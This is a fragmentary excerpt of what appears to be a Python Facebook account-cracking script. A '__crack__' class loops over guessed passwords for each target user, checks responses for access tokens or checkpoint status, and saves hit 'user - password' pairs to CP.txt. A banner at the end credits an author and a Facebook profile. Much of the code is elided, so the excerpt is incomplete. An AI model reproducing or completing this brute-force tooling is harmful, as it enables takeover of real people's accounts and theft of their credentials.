...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#TORBAAP('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
		...
		for pw in _sempak_:
			...
			if "access_token" in p:
				...
				try:
					...
					pass
				IMTIAZ_AKING('\r\033[1;91m[Checkpoint-Torbaap] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [Torbaap] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
...
/_/|_/_/ |_/____/____/\____/    
 ...
 [*]=============================================
    Author   : Torbap
    Facebook : https://facebook.com/saxonnahuel
    Team     : sex
 [*]=============================================
